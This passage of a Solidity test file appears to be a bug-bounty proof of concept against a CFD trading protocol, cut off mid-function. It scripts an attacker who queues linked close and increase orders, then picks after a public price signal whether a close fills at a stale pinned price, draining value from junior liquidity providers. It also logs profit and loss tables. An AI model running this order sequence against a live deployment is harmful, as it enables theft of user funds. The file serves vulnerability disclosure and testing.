    function _initialSeniorDeposit() internal pure virtual override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure virtual override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure virtual override returns (uint256) {
        return 1e6;
    }

    function setUp() public virtual override {
        super.setUp();

        IHousePool.PoolConfig memory poolConfig = IHousePool.PoolConfig({
            seniorRateBps: P_SENIOR_RATE_BPS,
            markStalenessLimit: P_POOL_MARK_STALENESS,
            seniorFrozenLpFeeBps: P_SENIOR_FROZEN_FEE_BPS,
            juniorFrozenLpFeeBps: P_JUNIOR_FROZEN_FEE_BPS,
            maxSeniorExposureAssets: P_MAX_SENIOR_EXPOSURE,
            maxSeniorShareBps: P_MAX_SENIOR_SHARE_BPS
        });
        pool.proposePoolConfig(poolConfig);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();

        IOrderRouterAdminHost.RouterConfig memory rc = IOrderRouterAdminHost.RouterConfig({
            maxExecutionWindowSeconds: P_MAX_EXECUTION_WINDOW,
            orderExecutionStalenessLimit: P_ORDER_STALENESS,
            liquidationStalenessLimit: P_LIQ_STALENESS,
            basketMaxConfidenceRatioBps: P_BASKET_MAX_CONF_BPS,
            orderSettlementWindow: P_ORDER_SETTLEMENT_WINDOW,
            maxComponentPublishTimeDivergence: P_MAX_PUBLISH_DIVERGENCE,
            adverseConfidenceMultiplierBps: P_ADVERSE_MULTIPLIER_BPS,
            minOpenNotionalAssets: P_MIN_OPEN_NOTIONAL,
            openOrderExecutionBountyBps: P_OPEN_BOUNTY_BPS,
            minOpenOrderExecutionBountyAssets: P_MIN_OPEN_BOUNTY,
            maxOpenOrderExecutionBountyAssets: P_MAX_OPEN_BOUNTY,
            positionProtectionTriggerBountyAssets: P_PROTECTION_BOUNTY,
            maxPendingOrders: P_MAX_PENDING_ORDERS,
            minEngineGas: P_MIN_ENGINE_GAS,
            maxPruneOrdersPerCall: P_MAX_PRUNE
        });
        _setRouterConfig(rc);

        if (
            engine.executionFeeBps() != P_EXECUTION_FEE_BPS || engine.settlementBufferBps() != P_SETTLEMENT_BUFFER_BPS
                || engine.frozenCloseSpreadBps() != P_FROZEN_SPREAD_BPS
        ) {
            ICfdEngineAdminHost.EngineRiskConfig memory riskConfig;
            riskConfig.riskParams = _riskParams();
            riskConfig.executionFeeBps = P_EXECUTION_FEE_BPS;
            riskConfig.frozenCloseSpreadBps = P_FROZEN_SPREAD_BPS;
            riskConfig.settlementBufferBps = P_SETTLEMENT_BUFFER_BPS;
            engineAdmin.proposeRiskConfig(riskConfig);
            vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
            engineAdmin.finalizeRiskConfig();
        }
        if (engine.fadMaxStaleness() != P_FAD_MAX_STALENESS || engine.engineMarkStalenessLimit() != P_ENGINE_MARK_STALENESS)
        {
            _setFreshnessConfig(
                ICfdEngineAdminHost.EngineFreshnessConfig({
                    fadMaxStaleness: P_FAD_MAX_STALENESS, engineMarkStalenessLimit: P_ENGINE_MARK_STALENESS
                })
            );
        }
        if (engine.fadRunwaySeconds() != P_FAD_RUNWAY) {
            ICfdEngineAdminHost.EngineCalendarConfig memory cal;
            cal.fadRunwaySeconds = P_FAD_RUNWAY;
            _setCalendarConfig(cal);
        }

        RealTick[] memory t = _realTicks();
        for (uint256 i; i < t.length; ++i) {
            ticks.push(t[i]);
        }
        _assertProductionConfig();
    }

    function _assertProductionConfig() internal view {
        (
            uint256 vpiFactor,
            uint256 maxSkewRatio,
            uint256 maintMarginBps,
            uint256 initMarginBps,
            uint256 fadMarginBps,
            uint256 baseCarryBps,
            uint256 minBountyAssets,
            uint256 bountyBps,
            uint256 keeperShareBps,
            uint256 protocolShareBps
        ) = engine.riskParams();
        assertEq(vpiFactor, 0.01e18, "vpiFactor");
        assertEq(maxSkewRatio, 0.4e18, "maxSkewRatio");
        assertEq(maintMarginBps, 10, "maintMarginBps");
        assertEq(initMarginBps, 20, "initMarginBps");
        assertEq(fadMarginBps, 300, "fadMarginBps");
        assertEq(baseCarryBps, 500, "baseCarryBps");
        assertEq(minBountyAssets, 1e6, "minBountyAssets");
        assertEq(bountyBps, 10, "bountyBps");
        assertEq(keeperShareBps, 5000, "keeperShareBps");
        assertEq(protocolShareBps, 0, "protocolShareBps");
        assertEq(engine.executionFeeBps(), P_EXECUTION_FEE_BPS, "executionFeeBps");
        assertEq(engine.settlementBufferBps(), P_SETTLEMENT_BUFFER_BPS, "settlementBufferBps");
        assertEq(engine.frozenCloseSpreadBps(), P_FROZEN_SPREAD_BPS, "frozenCloseSpreadBps");
        assertEq(engine.fadRunwaySeconds(), P_FAD_RUNWAY, "fadRunwaySeconds");
        assertEq(engine.fadMaxStaleness(), P_FAD_MAX_STALENESS, "fadMaxStaleness");
        assertEq(engine.engineMarkStalenessLimit(), P_ENGINE_MARK_STALENESS, "engineMarkStalenessLimit");
        assertEq(engine.CAP_PRICE(), 2e8, "CAP_PRICE");
        assertEq(router.maxExecutionWindowSeconds(), P_MAX_EXECUTION_WINDOW, "maxExecutionWindowSeconds");
        assertEq(router.minOpenNotionalAssets(), P_MIN_OPEN_NOTIONAL, "minOpenNotionalAssets");
        assertEq(router.openOrderExecutionBountyBps(), P_OPEN_BOUNTY_BPS, "openOrderExecutionBountyBps");
        assertEq(router.minOpenOrderExecutionBountyAssets(), P_MIN_OPEN_BOUNTY, "minOpenOrderExecutionBountyAssets");
        assertEq(router.maxOpenOrderExecutionBountyAssets(), P_MAX_OPEN_BOUNTY, "maxOpenOrderExecutionBountyAssets");
        assertEq(router.positionProtectionTriggerBountyAssets(), P_PROTECTION_BOUNTY, "positionProtectionTriggerBounty");
        assertEq(router.maxPendingOrders(), P_MAX_PENDING_ORDERS, "maxPendingOrders");
        assertEq(router.minEngineGas(), P_MIN_ENGINE_GAS, "minEngineGas");
        assertEq(router.maxPruneOrdersPerCall(), P_MAX_PRUNE, "maxPruneOrdersPerCall");
        assertEq(pletherOracle.orderExecutionStalenessLimit(), P_ORDER_STALENESS, "orderExecutionStalenessLimit");
        assertEq(pletherOracle.liquidationStalenessLimit(), P_LIQ_STALENESS, "liquidationStalenessLimit");
        assertEq(pletherOracle.basketMaxConfidenceRatioBps(), P_BASKET_MAX_CONF_BPS, "basketMaxConfidenceRatioBps");
        assertEq(pletherOracle.orderSettlementWindow(), P_ORDER_SETTLEMENT_WINDOW, "orderSettlementWindow");
        assertEq(
            pletherOracle.maxComponentPublishTimeDivergence(), P_MAX_PUBLISH_DIVERGENCE, "maxComponentPublishDivergence"
        );
        assertEq(pletherOracle.adverseConfidenceMultiplierBps(), P_ADVERSE_MULTIPLIER_BPS, "adverseConfidenceMultiplier");
        assertEq(pool.seniorRateBps(), P_SENIOR_RATE_BPS, "seniorRateBps");
        assertEq(pool.markStalenessLimit(), P_POOL_MARK_STALENESS, "pool markStalenessLimit");
        assertEq(pool.seniorFrozenLpFeeBps(), P_SENIOR_FROZEN_FEE_BPS, "seniorFrozenLpFeeBps");
        assertEq(pool.juniorFrozenLpFeeBps(), P_JUNIOR_FROZEN_FEE_BPS, "juniorFrozenLpFeeBps");
        assertEq(pool.maxSeniorExposureAssets(), P_MAX_SENIOR_EXPOSURE, "maxSeniorExposureAssets");
        assertEq(pool.maxSeniorShareBps(), P_MAX_SENIOR_SHARE_BPS, "maxSeniorShareBps");
        assertEq(juniorVault.maintenanceFeeAprBps(), 0, "junior maintenance fee");
        assertEq(seniorVault.maintenanceFeeAprBps(), 0, "senior maintenance fee");
    }

    function _now() internal view returns (uint256) {
        return vm.getBlockTimestamp();
    }

    function _at(
        uint256 ts
    ) internal {
        if (ts > vm.getBlockTimestamp()) {
            vm.warp(ts);
        }
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _tickData(
        RealTick memory t
    ) internal pure returns (bytes[] memory updateData) {
        MockPyth.FeedUpdate[] memory u = new MockPyth.FeedUpdate[](2);
        u[0] = MockPyth.FeedUpdate({
            id: BASE_PYTH_FEED_A,
            price: MockPyth.MockPrice(int64(uint64(t.feedA)), t.confA, int32(-8), t.publishTime, t.prevPublishTime)
        });
        u[1] = MockPyth.FeedUpdate({
            id: BASE_PYTH_FEED_B,
            price: MockPyth.MockPrice(int64(uint64(t.feedB)), t.confB, int32(-8), t.publishTime, t.prevPublishTime)
        });
        updateData = new bytes[](1);
        updateData[0] = abi.encode(u);
    }

    function _keeperTick(
        uint256 i
    ) internal {
        RealTick memory t = ticks[i];
        _at(t.blockTimestamp);
        if (engine.lastMarkTime() < t.publishTime) {
            vm.prank(KEEPER);
            router.updateMarkPrice(_tickData(t));
        }
        assertEq(engine.lastMarkPrice(), t.realMark, "engine mark == deployed engine's real lastMarkPrice");
        assertEq(uint256(engine.lastMarkTime()), t.publishTime, "engine mark time == real publish time");
    }

    function _book() internal view returns (IOrderLifecycleBook) {
        return IOrderLifecycleBook(address(router.lifecycleBook()));
    }

    function _req(
        CfdTypes.Side side,
        uint256 lots,
        uint256 margin,
        bool isClose
    ) internal returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = keccak256(abi.encode("close-admission-poc", ++nonce));
        r.side = side;
        r.sizeDelta = lots * CfdTypes.SIZE_QUANTUM;
        r.marginDelta = margin;
        r.targetPrice = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        r.isClose = isClose;
        r.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(_now()) + uint64(P_MAX_EXECUTION_WINDOW),
            executionWindowSeconds: uint32(P_MAX_EXECUTION_WINDOW),
            allowedExecutionModes: 7,
            expectedConfigHash: _book().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _exec(
        uint64 id,
        uint256 pinTick
    ) internal returns (OrderV3Types.ExecutionResult memory r) {
        bytes[] memory d = _tickData(ticks[pinTick]);
        vm.prank(EXECUTOR);
        r = router.executeOrder(id, d);
    }

    function _receipt(
        uint64 id
    ) internal returns (OrderV3Types.OrderReceipt memory) {
        return _verifiedReceipt(_book(), id);
    }

    function _sizeLots(
        address a
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(a);
        size /= CfdTypes.SIZE_QUANTUM;
    }

    function _openBounty(
        uint256 lots
    ) internal view returns (uint256 b) {
        uint256 commitPrice = engine.lastMarkPrice();
        b = (lots * commitPrice * router.openOrderExecutionBountyBps()) / 10_000;
        if (b < router.minOpenOrderExecutionBountyAssets()) {
            b = router.minOpenOrderExecutionBountyAssets();
        }
        if (b > router.maxOpenOrderExecutionBountyAssets()) {
            b = router.maxOpenOrderExecutionBountyAssets();
        }
    }

    function _juniorOf(
        address lp
    ) internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(lp));
    }

    function _seniorOf(
        address lp
    ) internal view returns (uint256) {
        return seniorVault.convertToAssets(seniorVault.balanceOf(lp));
    }

    function _signalCbp() internal pure returns (int256 moveCbp, uint256 prePx, uint256 postPx, uint256 n) {
        Trade[] memory t = _binanceEurUsdt();
        for (uint256 i; i < t.length; ++i) {
            if (t[i].timeUs < RELEASE_US) {
                prePx = t[i].priceE4;
            } else if (t[i].timeUs <= DECISION_US) {
                postPx = t[i].priceE4;
                ++n;
            }
        }
        moveCbp = ((int256(postPx) - int256(prePx)) * 1_000_000) / int256(prePx);
    }

    function _usd(
        uint256 atoms
    ) internal pure returns (string memory) {
        bytes memory f = bytes(vm.toString(atoms % 1e6 + 1e6));
        bytes memory frac = new bytes(6);
        for (uint256 i; i < 6; ++i) {
            frac[i] = f[i + 1];
        }
        return string.concat(vm.toString(atoms / 1e6), ".", string(frac));
    }

    function _usdSigned(
        int256 atoms
    ) internal pure returns (string memory) {
        return atoms < 0 ? string.concat("-", _usd(uint256(-atoms))) : string.concat("+", _usd(uint256(atoms)));
    }

    function _dumpLogs(
        string memory step,
        Vm.Log[] memory logs
    ) internal pure {
        console2.log("   raw system events of", step);
        for (uint256 i; i < logs.length; ++i) {
            console2.log("     event", i, logs[i].emitter);
            for (uint256 k; k < logs[i].topics.length; ++k) {
                console2.logBytes32(logs[i].topics[k]);
            }
            console2.logBytes(logs[i].data);
        }
    }

    function _lpDeposit(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        uint256 req = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        _at(vault.depositEpochStart(req));
        _settleLpEpochForTest();
        uint256 claimable = vault.claimableDepositRequest(req, lp);
        assertEq(claimable, amount, "deposit settled in full");
        vm.prank(lp);
        vault.claimDeposit(req, claimable, lp, lp);
    }

    function _prefix() internal {
        _startRecordingLogs();
        _at(T_FUND_REQ);
        _lpDeposit(juniorVault, LP_J, JUNIOR_ASSETS);
        _at(vm.getBlockTimestamp() + 5);
        _lpDeposit(seniorVault, LP_S, SENIOR_ASSETS);

        _keeperTick(0);
        assertFalse(engine.isFadWindow(), "live market, not FAD");
        assertFalse(engine.isOracleFrozen(), "live market, not frozen");

        settlementToken.mint(OTHER, OTHER_FUND);
        vm.prank(OTHER);
        other = new TraderAccount(address(router), address(clearinghouse), address(settlementToken));
        vm.prank(OTHER);
        settlementToken.approve(address(other), OTHER_FUND);
        vm.prank(OTHER);
        other.fund(OTHER_FUND);
        _at(T_OTHER_COMMIT);
        OrderV3Types.OrderRequest memory r = _req(CfdTypes.Side.SHORT, OTHER_SHORT_LOTS, OTHER_MARGIN, false);
        vm.prank(OTHER);
        uint64 idOther = other.commit(r);
        _keeperTick(1);
        assertEq(uint8(_exec(idOther, 1).terminalReason), uint8(OrderV3Types.TerminalReason.Executed), "OTHER fills");
        assertEq(_receipt(idOther).executionPrice, PX_SHORT_OPEN_1328, "OTHER's SHORT at the real 13:28:55 price");

        settlementToken.mint(ATTACKER, ATTACKER_FUND);
        vm.prank(ATTACKER);
        acct = new TraderAccount(address(router), address(clearinghouse), address(settlementToken));
        vm.prank(ATTACKER);
        settlementToken.approve(address(acct), ATTACKER_FUND);
        vm.prank(ATTACKER);
        acct.fund(ATTACKER_FUND);
    }

    function _openBase(
        uint256 liveAfterC0Lots
    ) internal {
        _at(T_BASE_COMMIT);
        OrderV3Types.OrderRequest memory r =
            _req(CfdTypes.Side.LONG, liveAfterC0Lots + C0_LOTS, BASE_MARGIN, false);
        vm.prank(ATTACKER);
        uint64 id = acct.commit(r);
        _keeperTick(2);
        assertEq(uint8(_exec(id, 2).terminalReason), uint8(OrderV3Types.TerminalReason.Executed), "base LONG fills");
        assertEq(_receipt(id).executionPrice, PX_LONG_OPEN_1329, "base LONG at the real 13:29:28 price");
    }

    function _arm(
        uint256 liveAfterC0Lots
    ) internal {
        _at(T_ARM);
        uint256 base = liveAfterC0Lots + C0_LOTS;
        OrderV3Types.OrderRequest memory c0 = _req(CfdTypes.Side.LONG, C0_LOTS, 0, true);
        OrderV3Types.OrderRequest memory i0 = _req(CfdTypes.Side.LONG, I0_LOTS, 0, false);
        OrderV3Types.OrderRequest memory c1 = _req(CfdTypes.Side.LONG, base - C0_LOTS + I0_LOTS, 0, true);
        uint256 bounty = _openBounty(I0_LOTS);
        vm.prank(ATTACKER);
        (idC0, idI0, idC1) = acct.arm(bounty, c0, i0, c1);
    }

    function _run(
        World w
    ) internal returns (Outcome memory o) {
        vm.getRecordedLogs();
        if (w != World.Baseline) {
            _openBase(LIVE_AFTER_C0_LOTS);
            _arm(LIVE_AFTER_C0_LOTS);
        }
        if (w == World.Attack) {
            (int256 moveCbp,,,) = _signalCbp();
            assertLe(moveCbp, -SIGNAL_THRESHOLD_CBP, "public signal at 13:30:02.300 says the release favours the LONG");
            _at(T_DECIDE);
            bytes[] memory pin = _tickData(ticks[3]);
            vm.prank(ATTACKER);
            (OrderV3Types.ExecutionResult memory rc0,) = acct.kill(idC0, pin);
            assertEq(uint8(rc0.terminalReason), uint8(OrderV3Types.TerminalReason.Executed), "C0 filled at the pin");
            o.liveAfterKill = _sizeLots(address(acct));
            _keeperTick(3);
            _exec(idI0, 3);
            _exec(idC1, 3);
            _at(T_EXIT_COMMIT);
            OrderV3Types.OrderRequest memory exitReq = _req(CfdTypes.Side.LONG, _sizeLots(address(acct)), 0, true);
            vm.prank(ATTACKER);
            uint64 idExit = acct.commit(exitReq);
            _keeperTick(4);
            _exec(idExit, 4);
            o.exitPrice = _receipt(idExit).executionPrice;
        } else if (w == World.Honest) {
            _keeperTick(3);
            _exec(idC0, 3);
            _exec(idI0, 3);
            _exec(idC1, 3);
            _keeperTick(4);
        } else if (w == World.ExecutorFirst) {
            _at(T_DECIDE);
            _exec(idC0, 3);
            _exec(idI0, 3);
            _exec(idC1, 3);
            _keeperTick(3);
            _keeperTick(4);
        } else {
            _keeperTick(2);
            _keeperTick(3);
            _keeperTick(4);
        }
        _at(T_END);
        if (w != World.Baseline) {
            assertEq(_sizeLots(address(acct)), 0, "attacker flat at the end");
            if (w == World.Attack) {
                _takeRecordedLogs();
            }
            vm.prank(ATTACKER);
            acct.withdrawAll();
            if (w == World.Attack) {
                _dumpLogs("ATTACK: attacker withdraws everything to its wallet (13:30:38)", _takeRecordedLogs());
            }
            o.c0Reason = uint8(_receipt(idC0).reason);
            OrderV3Types.OrderReceipt memory ri = _receipt(idI0);
            o.i0Reason = uint8(ri.reason);
            o.i0Code = ri.failure.code;
            o.i0Bounty = ri.bountyAssets;
            OrderV3Types.OrderReceipt memory rc = _receipt(idC1);
            o.c1Reason = uint8(rc.reason);
            o.c1Code = rc.failure.code;
            o.c1Price = rc.executionPrice;
        }
        o.attackerWallet = settlementToken.balanceOf(ATTACKER);
        o.victimJunior = _juniorOf(LP_J);
        o.senior = _seniorOf(LP_S);
        o.poolAssets = pool.totalAssets();
        o.treasury = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT)
            + settlementToken.balanceOf(PROTOCOL_TREASURY_ACCOUNT);
        o.otherBalance = clearinghouse.balanceAssets(address(other));
    }

    function test_root_closeAdmittedAgainstPendingIncrease() public {
        _prefix();
        _openBase(LIVE_AFTER_C0_LOTS);
        _at(T_ARM);
        uint256 c1Lots = BASE_LOTS - C0_LOTS + I0_LOTS;
        uint256 snap = vm.snapshotState();

        OrderV3Types.OrderRequest memory c0 = _req(CfdTypes.Side.LONG, C0_LOTS, 0, true);
        vm.prank(ATTACKER);
        acct.commit(c0);
        OrderV3Types.OrderRequest memory c1 = _req(CfdTypes.Side.LONG, c1Lots, 0, true);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__SizeExceedsQueued.selector);
        vm.prank(ATTACKER);
        acct.commit(c1);
        console2.log("live LONG lots                              ", _sizeLots(address(acct)));
        console2.log("C0 then C1 (lots) WITHOUT a pending increase", c1Lots, "-> OrderRouter__SizeExceedsQueued");

        vm.revertToState(snap);
        _arm(LIVE_AFTER_C0_LOTS);
        (IOrderRouterAccounting.PendingOrderView memory vc1,) = router.getPendingOrderView(idC1);
        (IOrderRouterAccounting.PendingOrderView memory vi0,) = router.getPendingOrderView(idI0);
        assertEq(vc1.sizeDelta, c1Lots * CfdTypes.SIZE_QUANTUM, "C1 is pending at the full queued size");
        assertTrue(vc1.isClose, "C1 is a close");
        assertEq(vi0.marginDelta, 0, "I0 carries no margin");
        assertEq(vc1.commitTime, vi0.commitTime, "C1 and I0 share one commit second, so one pinned publication");
        console2.log("C0, I0 (+11 lots, marginDelta 0) then the SAME C1 -> admitted; pending C1 order id", idC1);
        console2.log("  admitted because live - c0 + i0 =", BASE_LOTS - C0_LOTS + I0_LOTS, ">= C1 lots");
        console2.log("  but C1 > live - c0 =", BASE_LOTS - C0_LOTS, ": C1 can only fill if I0 fills first");
        console2.log("  I0 bounty reserved at commit (USDG atoms)", vi0.executionBountyAssets);
        console2.log("  free settlement after the arm (USDG atoms)", clearinghouse.getFreeBuyingPowerAssets(address(acct)));
        uint8 preview = engineLens.previewOpenRevertCode(
            address(acct), CfdTypes.Side.LONG, I0_LOTS * CfdTypes.SIZE_QUANTUM, 0, engine.lastMarkPrice()
        );
        console2.log("  engine lens commit-screen code for I0 (5 = MARGIN_DRAINED_BY_FEES, execution-time)", preview);
        assertEq(preview, 5, "the commit screen sees I0 as MARGIN_DRAINED_BY_FEES, a code it admits");
    }

    function test_lever_ownerDecidesAfterPin() public {
        _prefix();
        _openBase(LIVE_AFTER_C0_LOTS);
        _arm(LIVE_AFTER_C0_LOTS);
        _at(T_DECIDE);
        vm.prank(EXECUTOR);
        OrderV3Types.ExecutionResult memory rc0 = router.executeOrder(idC0, _tickData(ticks[3]));
        assertEq(uint8(rc0.terminalReason), uint8(OrderV3Types.TerminalReason.Executed), "C0 fills at the pin");
        assertEq(_receipt(idC0).executionPrice, PX_LONG_CLOSE_PIN, "C0 at the real 13:30:00 LONG close price");
        uint256 freeAfterC0 = clearinghouse.getFreeBuyingPowerAssets(address(acct));
        console2.log("after C0 (13:30:00 pin): live LONG lots", _sizeLots(address(acct)));
        console2.log("after C0: free settlement (USDG atoms) refilled by C0's released margin", freeAfterC0);
        uint256 snap = vm.snapshotState();

        vm.prank(ATTACKER);
        acct.withdraw(freeAfterC0);
        _keeperTick(3);
        vm.recordLogs();
        OrderV3Types.ExecutionResult memory ki = _exec(idI0, 3);
        OrderV3Types.ExecutionResult memory kc = _exec(idC1, 3);
        _dumpLogs("KILL: executor runs I0 then C1 at the pin", _takeRecordedLogs());
        OrderV3Types.OrderReceipt memory kri = _receipt(idI0);
        OrderV3Types.OrderReceipt memory krc = _receipt(idC1);
        console2.log("KILL  I0: status", uint256(ki.status), "reason (7 = PlannerRejected)", uint256(ki.terminalReason));
        console2.log("KILL  I0: failure code (open 5 = MARGIN_DRAINED_BY_FEES)", uint256(kri.failure.code));
        console2.log("KILL  C1: status", uint256(kc.status), "reason (7 = PlannerRejected)", uint256(kc.terminalReason));
        console2.log("KILL  C1: failure code (close 1 = CLOSE_SIZE_EXCEEDS)", uint256(krc.failure.code));
        console2.log("KILL  live LONG lots after the queue", _sizeLots(address(acct)));
        console2.log("KILL  I0 bounty paid to the executor (USDG atoms)", kri.bountyAssets);
        assertEq(uint8(ki.terminalReason), uint8(OrderV3Types.TerminalReason.PlannerRejected), "I0 terminal");
        assertEq(kri.failure.code, 5, "I0 MARGIN_DRAINED_BY_FEES");
        assertEq(uint8(kc.terminalReason), uint8(OrderV3Types.TerminalReason.PlannerRejected), "C1 terminal");
        assertEq(krc.failure.code, 1, "C1 CLOSE_SIZE_EXCEEDS");
        assertEq(_sizeLots(address(acct)), LIVE_AFTER_C0_LOTS, "the 25.3M LONG stays open");

        vm.revertToState(snap);
        vm.getRecordedLogs();
        _keeperTick(3);
        vm.recordLogs();
        OrderV3Types.ExecutionResult memory fi = _exec(idI0, 3);
        OrderV3Types.ExecutionResult memory fc = _exec(idC1, 3);
        _dumpLogs("FILL: executor runs I0 then C1 at the pin", _takeRecordedLogs());
        OrderV3Types.OrderReceipt memory fri = _receipt(idI0);
        OrderV3Types.OrderReceipt memory frc = _receipt(idC1);
        console2.log("FILL  I0: reason (1 = Executed)", uint256(fi.terminalReason), "price", fri.executionPrice);
        console2.log("FILL  C1: reason (1 = Executed)", uint256(fc.terminalReason), "price", frc.executionPrice);
        console2.log("FILL  live LONG lots after the queue", _sizeLots(address(acct)));
        assertEq(uint8(fi.terminalReason), uint8(OrderV3Types.TerminalReason.Executed), "I0 fills");
        assertEq(fri.executionPrice, PX_LONG_OPEN_PIN, "I0 at the real 13:30:00 LONG open price");
        assertEq(uint8(fc.terminalReason), uint8(OrderV3Types.TerminalReason.Executed), "C1 fills");
        assertEq(frc.executionPrice, PX_LONG_CLOSE_PIN, "C1 closes the whole LONG at the pre-release pin");
        assertEq(_sizeLots(address(acct)), 0, "flat");
    }

    function test_threshold_atRealPinConfidence() public {
        _prefix();
        uint256 snap = vm.snapshotState();
        uint256[4] memory sizes =
            [THRESHOLD_LIVE_AFTER_C0 - 2, THRESHOLD_LIVE_AFTER_C0 - 1, THRESHOLD_LIVE_AFTER_C0, THRESHOLD_LIVE_AFTER_C0 + 1];
        console2.log("real pin basket confidence (8-dec) and adverse shift", ticks[3].basketConf, (ticks[3].basketConf * 2500) / 10_000);
        for (uint256 k; k < sizes.length; ++k) {
            vm.revertToState(snap);
            snap = vm.snapshotState();
            vm.getRecordedLogs();
            _openBase(sizes[k]);
            _arm(sizes[k]);
            _keeperTick(3);
            _exec(idC0, 3);
            OrderV3Types.ExecutionResult memory ri = _exec(idI0, 3);
            OrderV3Types.ExecutionResult memory rc = _exec(idC1, 3);
            OrderV3Types.OrderReceipt memory rri = _receipt(idI0);
            console2.log(
                string.concat(
                    "live after C0 ",
                    vm.toString(sizes[k]),
                    " lots (",
                    _usd(sizes[k] * PX_LONG_CLOSE_PIN),
                    " USDG): I0 reason ",
                    vm.toString(uint256(ri.terminalReason)),
                    " code ",
                    vm.toString(uint256(rri.failure.code)),
                    "; C1 reason ",
                    vm.toString(uint256(rc.terminalReason))
                )
            );
            if (sizes[k] < THRESHOLD_LIVE_AFTER_C0) {
                assertEq(rri.failure.code, 9, "below threshold: I0 LIQUIDATION_RESERVE_UNFUNDED");
                assertEq(uint8(rc.terminalReason), uint8(OrderV3Types.TerminalReason.PlannerRejected), "C1 dies");
            } else {
                assertEq(uint8(ri.terminalReason), uint8(OrderV3Types.TerminalReason.Executed), "at threshold: I0 fills");
                assertEq(uint8(rc.terminalReason), uint8(OrderV3Types.TerminalReason.Executed), "C1 fills");
            }
        }
    }

    function test_impact_nfpRelease() public {
        _prefix();
        (int256 moveCbp, uint256 prePx, uint256 postPx, uint256 n) = _signalCbp();
        console2.log("signal: Binance EUR/USDT last pre-release trade (x1e4)", prePx);
        console2.log("signal: last trade by 13:30:02.300 (x1e4), trades since 13:30:00", postPx, n);
        console2.log("signal: move in 1/100 bp (EUR down = USD up = basket down = LONG gains)");
        console2.logInt(moveCbp);

        uint256 snap = vm.snapshotState();
        Outcome memory a = _run(World.Attack);
        vm.revertToState(snap);
        snap = vm.snapshotState();
        Outcome memory h = _run(World.Honest);
        vm.revertToState(snap);
        snap = vm.snapshotState();
        Outcome memory e = _run(World.ExecutorFirst);
        vm.revertToState(snap);
        Outcome memory b = _run(World.Baseline);

        int256 attackNet = int256(a.attackerWallet) - int256(ATTACKER_FUND);
        int256 honestNet = int256(h.attackerWallet) - int256(ATTACKER_FUND);
        int256 firstNet = int256(e.attackerWallet) - int256(ATTACKER_FUND);
        int256 victimVsHonest = int256(a.victimJunior) - int256(h.victimJunior);
        int256 victimVsBaseline = int256(a.victimJunior) - int256(b.victimJunior);
        int256 poolVsHonest = int256(a.poolAssets) - int256(h.poolAssets);
        int256 seniorVsHonest = int256(a.senior) - int256(h.senior);
        int256 treasuryVsHonest = int256(a.treasury) - int256(h.treasury);

        console2.log("");
        console2.log("ATTACK: C0 reason", a.c0Reason, "live LONG lots after the kill", a.liveAfterKill);
        console2.log("ATTACK: I0 reason / code (7/5 = PlannerRejected MARGIN_DRAINED_BY_FEES)", a.i0Reason, a.i0Code);
        console2.log("ATTACK: C1 reason / code (7/1 = PlannerRejected CLOSE_SIZE_EXCEEDS)", a.c1Reason, a.c1Code);
        console2.log("ATTACK: LONG closed at 13:30:35 publication, price", a.exitPrice);
        console2.log("HONEST: C1 reason (1 = Executed), price (the 13:30:00 pin)", h.c1Reason, h.c1Price);
        console2.log("EXECUTOR_FIRST: C1 reason, price", e.c1Reason, e.c1Price);
        console2.log("");
        console2.log("                                       ATTACK              HONEST              EXECUTOR_FIRST      BASELINE");
        console2.log(
            string.concat(
                "  attacker wallet (USDG)               ", _pad(_usd(a.attackerWallet)), _pad(_usd(h.attackerWallet)),
                _pad(_usd(e.attackerWallet)), _pad(_usd(b.attackerWallet))
            )
        );
        console2.log(
            string.concat(
                "  victim LP_J Junior value (USDG)      ", _pad(_usd(a.victimJunior)), _pad(_usd(h.victimJunior)),
                _pad(_usd(e.victimJunior)), _pad(_usd(b.victimJunior))
            )
        );
        console2.log(
            string.concat(
                "  LP_S Senior value (USDG)             ", _pad(_usd(a.senior)), _pad(_usd(h.senior)), _pad(_usd(e.senior)),
                _pad(_usd(b.senior))
            )
        );
        console2.log(
            string.concat(
                "  HousePool.totalAssets (USDG)         ", _pad(_usd(a.poolAssets)), _pad(_usd(h.poolAssets)),
                _pad(_usd(e.poolAssets)), _pad(_usd(b.poolAssets))
            )
        );
        console2.log(
            string.concat(
                "  protocol treasury (USDG)             ", _pad(_usd(a.treasury)), _pad(_usd(h.treasury)), _pad(_usd(e.treasury)),
                _pad(_usd(b.treasury))
            )
        );
        console2.log("");
        console2.log("IMPACT row: Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield");
        console2.log(string.concat("IMPACT attacker wallet net, ATTACK: ", _usdSigned(attackNet), " USDG (minted 300,000, all withdrawn)"));
        console2.log(string.concat("IMPACT attacker wallet net, HONEST (same orders, binding close): ", _usdSigned(honestNet), " USDG"));
        console2.log(string.concat("IMPACT attacker wallet net, EXECUTOR_FIRST (worst case for the attacker): ", _usdSigned(firstNet), " USDG"));
        console2.log(string.concat("IMPACT victim LP_J Junior, ATTACK vs HONEST: ", _usdSigned(victimVsHonest), " USDG"));
        console2.log(string.concat("IMPACT victim LP_J Junior, ATTACK vs BASELINE (no attacker): ", _usdSigned(victimVsBaseline), " USDG"));
